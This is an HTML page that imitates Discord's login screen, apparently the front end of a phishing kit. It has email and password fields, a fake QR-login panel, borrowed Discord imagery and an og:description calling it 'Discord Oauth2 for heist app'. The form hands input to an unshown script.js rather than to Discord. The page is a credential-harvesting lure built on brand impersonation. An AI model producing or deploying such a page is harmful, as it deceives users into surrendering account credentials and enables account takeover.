<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/x-icon" href="C:\Users\ThinkPad\Downloads\images__1_-removebg-preview.png">
    <meta property="og:title" content="Discord">
    <meta property="og:description" content="Discord Oauth2 for heist app"> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="background"></div>

<div class="login-card">

    <div class="left">
        <div class="header">
            <h1>Welcome Back!</h1>
            <p>We're so excited to see you again!</p>
        </div>

       <form id="loginForm">

    <label for="email">Email</label>

    <input
        type="email"
        id="email"
        name="email"
        placeholder="Enter your email"
        autocomplete="email"
        required
    >

    <label for="password">Password</label>

    <input
        type="password"
        id="password"
        name="password"
        placeholder="Enter your password"
        autocomplete="current-password"
        required
    >

    <div class="forgot-container">
        <a href="#" class="forgot-password">Forgot Password?</a>
    </div>

    <button type="submit">
        Log In
    </button>

    <div class="discord-watermark">
        <img src="https://i.postimg.cc/2SbS6jtT/images-2-removebg-preview.png" alt="Discord" class="discord-watermark-logo">
    </div>

</form>
    </div>

    <div class="right">
        <img src="https://i.postimg.cc/LhKnfNXm/upscalemedia-transformed.png" alt="Illustration">

        <h3>Log in with QR Code</h3>
        <p>Scan this with the Discord mobile app to log in instantly.</p>
    </div>

</div>

<script src="script.js"></script>

</body>
</html>
